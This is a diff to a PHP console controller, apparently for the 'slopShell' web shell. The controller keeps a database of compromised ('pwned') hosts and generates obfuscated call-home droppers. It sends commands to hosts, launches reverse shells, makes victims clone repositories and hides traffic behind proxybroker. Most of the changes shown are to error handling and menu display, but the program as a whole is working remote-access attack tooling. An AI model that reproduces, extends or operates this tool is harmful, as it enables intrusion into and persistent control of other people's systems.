@@ -1,5 +1,10 @@
 <?php
 posix_setuid(getmyuid());
+if (strtolower(php_uname()) == "windows") {
+    define('clears', 'cls');
+}else{
+    define('clears', "clear");
+}
 require "includes/db/postgres_checker.php";
 require "includes/droppers/dynamic_generator.php";
 $cof = array(
@@ -12,7 +17,7 @@ $cof = array(
     "dbname"=>"sloppy_bots"
 );
 
-pclose(popen("nohup proxybroker serve --host 127.0.0.1 --port 8090 --types HTTPS HTTP --lvl High &", "r"));
+popen("proxybroker serve --host 127.0.0.1 --port 8090 --types HTTPS HTTP --lvl High", "r+");
 is_file("sloppy_config.ini") ? define("config", parse_ini_file('sloppy_config.ini', true)):define("config", $cof);
 
 try{
@@ -24,9 +29,10 @@ try{
 }
 define('ppg', pg_connect("host=" . config['host'] . " port=" . config['port'] . " user=" . config['username'] . " password=" . config['password'] . "dbname=".config['dbname']));
 
-function logo($last, $cl){
+function logo($last, $cl, bool $error, $error_value){
     if ($last === "q"){
         system($cl);
+        system("killall proxybroker");
         echo("\033[33;40m                                                                                    \033[0m\n");
         echo("\033[33;40m    ▄▄▄▄▄   █    ████▄ █ ▄▄  █ ▄▄ ▀▄    ▄     ▄█▄    █    ▄█ ▄███▄      ▄     ▄▄▄▄▀ \033[0m\n");
         echo("\033[33;40m   █     ▀▄ █    █   █ █   █ █   █  █  █      █▀ ▀▄  █    ██ █▀   ▀      █ ▀▀▀ █    \033[0m\n");
@@ -37,7 +43,7 @@ function logo($last, $cl){
         echo("\033[33;40m                                                                                    \033[0m\n");
         echo("\033[33;40m  Gr33tz: Notroot, J5                                                               \033[0m\n");
         echo("\033[33;40m  Git: https://github.com/oldkingcone/slopShell                                     \033[0m\n");
-
+        print("\033[33;40m  All proxybroker instances have been killed, they died in peace.. in their sleep. F in chat to pay respects.\n");
     }else if (is_null($last))  {
         system($cl);
         echo("\033[33;40m                                                                                    \033[0m\n");
@@ -62,6 +68,15 @@ function logo($last, $cl){
         echo("\033[33;40m                         ▀     ▀                                     █   ██         \033[0m\n");
         echo("\033[33;40m                                                                                    \033[0m\n");
         echo("\033[33;40m  Last command: $last                                                               \033[0m\n");
+        if ($error === true && !empty($error_value)) {
+            if (is_array($error_value)) {
+                echo("\033[33;40m  What was the error:                                                           \033[0m\n");
+                echo "\t".print_r($error_value);
+                echo "\n";
+            }else{
+                echo("\033[33;40m  User Supplied Values:\n$error_value                                                           \033[0m\n");
+            }
+        }
         menu();
     }
 
@@ -91,7 +106,7 @@ function opts(){
     foreach (config as $temp=>$values){
         print($temp." => ".$values."\n");
     }
-    print("\n".str_repeat("-", 35) . "\n");
+    print("\n\n".str_repeat("-", 35) . "\n");
     print("\n\nCurrent DB Status:\n\n");
     if (ppg == PGSQL_CONNECTION_OK or ppg == PGSQL_CONNECTION_AUTH_OK){
         print("\nConnected!");
@@ -101,9 +116,10 @@ function opts(){
     }else{
         print("Could not connect... ensure the DB is running and we are allowed to connect to it.");
     }
-    print("\n".str_repeat("-", 35) . "\n");
+    print("\n\n".str_repeat("-", 35) . "\n");
     print("\n\nProxybroker?\n\n");
-    print(system("ps aux | grep proxybroker")."\n");
+    system("ps aux | grep proxybroker");
+    echo "\n";
 }
 
 function sys($host, $uri)
@@ -124,7 +140,7 @@ function sys($host, $uri)
 
         }
     } else {
-        print("[ !! ] Host was empty... [ !! ]");
+        logo('s', clears, true, "Host and/or URI was empty, please double check.");
     }
     return 0;
 }
@@ -150,6 +166,8 @@ function rev($host, $shell, $port, $os)
             echo "OS: ". $os."\n";
         }
         echo "[ ++ ] Trying: " . $host . " on " . $usePort . "[ ++ ]\n";
+    }else{
+        logo('reverse', clears, true, '');
     }
 
 }
@@ -174,7 +192,12 @@ function co($command, $host, $uri)
 
         }
     } else {
-        print("[ !! ] Host was empty... [ !! ]");
+        $error = array(
+            "Command" => $command,
+            "Host" => $host,
+            "URI" => $uri
+        );
+        logo('co', clears, true, $error);
     }
     return 0;
 }
@@ -189,23 +212,36 @@ function clo($host, $repo, $uri)
         curl_setopt(CHH, CURLOPT_POST,                              true);
         curl_setopt(CHH, CURLOPT_POSTFIELDS,               "clone=$repo");
         $re = curl_exec(CHH);
+        $http_code = curl_getinfo(CHH, CURLINFO_HTTP_CODE);
         if (!curl_errno(CHH)){
-            switch ($http_code = curl_getinfo(CHH, CURLINFO_HTTP_CODE)){
+            switch ($http_code){
                 case 200:
                     return $re;
                 default:
                     throw new Exception("Appears our shell was caught, or the reported URI was wrong.\nPlease Manually confirm.\n");
             }
         }else{
-            return 0;
+            $errors = array(
+                "Host" => $host,
+                "Repo" => $repo,
+                "Target URI" => $uri,
+                "Curl Error" => $http_code
+            );
+            logo('cloner', clears, true, $errors);
         }
     }else{
-        return 0;
+        $errors = array(
+            "Host" => $host,
+            "Repo" => $repo,
+            "Target URI" => $uri
+        );
+        logo('cloner', clears, true, $errors);
     }
 
 }
 
-function createDropper($callHome, $duration, $obfsucate, $depth){
+function createDropper($callHome, $duration, $obfsucate, $depth)
+{
     echo "Starting dropper creation\n";
     $file_in = "includes/base.php";
     $t = new dynamic_generator();
@@ -233,9 +269,24 @@ function createDropper($callHome, $duration, $obfsucate, $depth){
             }
 
         }catch (Exception $exception){
-            throw new Exception("Could not create dropper.\n");
+            $empty = array(
+                "Callhome" => $callHome,
+                "Duration" => $duration,
+                "Obfuscate" => $obfsucate,
+                "Depth" => $depth,
+                "Actual Exception" => $exception
+            );
+            logo('cr', clears, true, $empty);
         }
 
+    }else{
+        $empty = array(
+            "Callhome" => $callHome,
+            "Duration" => $duration,
+            "Obfuscate" => $obfsucate,
+            "Depth" => $depth
+        );
+        logo('cr', clears, true, $empty);
     }
 }
 
@@ -258,6 +309,8 @@ function aHo($host)
                 $t->getRecord($host);
             }
         }
+    }else{
+        logo('add host', clears, true, $host);
     }
 }
 
@@ -321,10 +374,13 @@ function check($host, $path, $batch)
                     }
                 }
         }
+    }else{
+        logo("cr", "", true, "");
     }
 }
 
-function queryDB($host, $fetchWhat){
+function queryDB($host, $fetchWhat)
+{
     # place holder for the query db function. this will check what information we have about a host, and which options to set.
     # so Example would be a windows based host, it will preset windows options for you when you execute rev, or you can set your own.
     # work in progress.
@@ -346,27 +402,36 @@ function queryDB($host, $fetchWhat){
                 return 0;
             }
         }catch (Exception $e){
-            return $e;
+            $errors = array(
+                "Host" => $host,
+                "Fetch What?" => $fetchWhat,
+                "Explicit Error" => $e
+            );
+            logo('query DB', clears, true, $errors);
         }
 
 
     }else {
-        throw new Exception("Host was 0, are you sure you added it into the DB?\n");
+        $errors = array(
+            "Host" => $host,
+            "Fetch What?" => $fetchWhat
+        );
+        logo('query DB', clears, true, $errors);
     }
 }
 
-(strtolower(php_uname()) == "windows") ? $clears='cls':$clears="clear";
+
 $run = true;
-logo($lc = null, $clears);
+logo($lc = null, clears, "", "");
 while ($run) {
     print("\n\033[33;40mPlease select your choice: \n->");
     echo("\033[0m");
     $pw = trim(fgets(STDIN));
     $lc = $pw;
-    logo($lc, $clears);
+    logo($lc, clears, "", "");
     switch (strtolower($pw)) {
         case "cr":
-            system($clears);
+            system(clears);
             echo("Where are we calling home to? (hostname/ip)->");
             $h_name = trim(fgets(STDIN));
             echo("How often should we call home? (int) ->");
@@ -382,24 +447,22 @@ while ($run) {
             createDropper($h_name, $d_int, $osb, $de);
             break;
         case "s":
-            system($clears);
+            system(clears);
             $h = readline("Which host are we checking?\n->");
             try {
                 sys($h, queryDB($h, "s"));
             }catch (Exception $e){
-                logo($clears, "s");
-                echo $e."\n";
+                logo("s", clears, true, $e);
             }
             break;
         case "r":
-            system($clears);
+            system(clears);
             $h = readline("Please tell me the host.\n->");
             $p = readline("\nWhich port shall we use?\n->");
             try {
                 $o = !empty(queryDB($h, 'r')) ? "win" : "lin";
             } catch (Exception $e) {
-                logo($lc, $clears);
-                echo $e."\n";
+                logo("r", clears, true, $e);
             }
             echo $o;
             if (!empty($h) && !empty($p)){
@@ -407,28 +470,27 @@ while ($run) {
             }
             break;
         case "c":
-            system($clears);
+            system(clears);
             try{
                 $h = readline("Which host are we sending the command to?\n->");
                 $c = readline("And now the command: \n->");
                 co($c, $h, queryDB($h, 'c'));
             }catch (Exception $e){
-                logo($lc, $clears);
-                echo $e."\n";
+                logo("c", clears, true, $e);
             }
             break;
         case "cl":
-            system($clears);
+            system(clears);
             try{
                 $h = readline("Which host are we interacting with?\n->");
                 $rep = readline("Repo to clone?\n->");
                 clo($h, $rep, queryDB($h, "cl"));
             }catch (Exception $e){
-                echo $e."\n";
+                logo("cl", clears, true, $e);
             }
             break;
         case "u":
-            system($clears);
+            system(clears);
 //            echo "Will be in future editions.\n";
             if (strstr(getcwd(), "slopShell") == true) {
                 system("git pull");
@@ -438,17 +500,16 @@ while ($run) {
             }
             break;
         case "a":
-            system($clears);
+            system(clears);
             try{
                 $h = readline("Who did we pwn my friend?\n->");
                 aHo($h);
             }catch (Exception $e){
-                logo($lc, $clears);
-                echo $e."\n";
+                logo("a", clears, true, $e);
             }
             break;
         case "ch":
-            system($clears);
+            system(clears);
             try{
                 $h = readline("Who is it we need to check on?\n->");
                 $b = readline("Is this going to be a batch job?(Y/N)\n->");
@@ -462,29 +523,25 @@ while ($run) {
                         check($h, queryDB($h, "ch"), "y");
                         break;
                     default:
-                        echo "Your host was empty, sorry but I will return you to the previous menu.\n";
+                        logo('ch',clears,true ,"Your host was empty, sorry but I will return you to the previous menu.\n");
                         break;
                 }
             }catch (Exception $e){
-                logo($lc, $clears);
-                echo $e."\n";
+                logo("ch", clears, true, $e);
             }
             break;
         case "m":
-            logo($lc, $clears);
+            logo($lc, clears, "", "");
             break;
         case "q":
-            logo($lc, $clears);
-            system("killall proxybroker");
-            print("\033[33;40m  All proxybroker instances have been killed, they died in peace.. in their sleep. F in chat to pay respects.\n");
-            echo "  Good bye!\033[0m\n";
+            logo('q', clears, false, '');
             $run = false;
             break;
         case "o":
             opts();
             break;
         default:
-            logo($lc, $clears);
+            logo($lc, clears, "", "");
             echo "\033[33;40myou need to select a valid option...\033[0m\n";
     }
 }
